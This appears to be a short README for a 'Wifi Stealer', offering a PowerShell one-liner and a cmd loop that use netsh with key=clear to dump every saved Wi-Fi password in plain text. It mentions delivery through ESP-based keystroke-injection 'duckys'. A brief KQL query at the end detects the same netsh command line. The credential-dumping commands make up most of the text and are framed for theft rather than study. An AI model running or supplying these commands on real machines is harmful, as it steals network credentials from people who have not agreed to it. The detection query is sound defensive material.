# WifiStealing
Wifi Stealer inspired by Manjuska Framework/TCM

Wireless will always be inferior 
:)

(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -Wrap 


for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear


WHID for ESP based duckys

# KQL  

```
DeviceProcessEvents
| where ProcessCommandLine contains "key=clear" //plain-text
| where FileName == "netsh.exe"
```
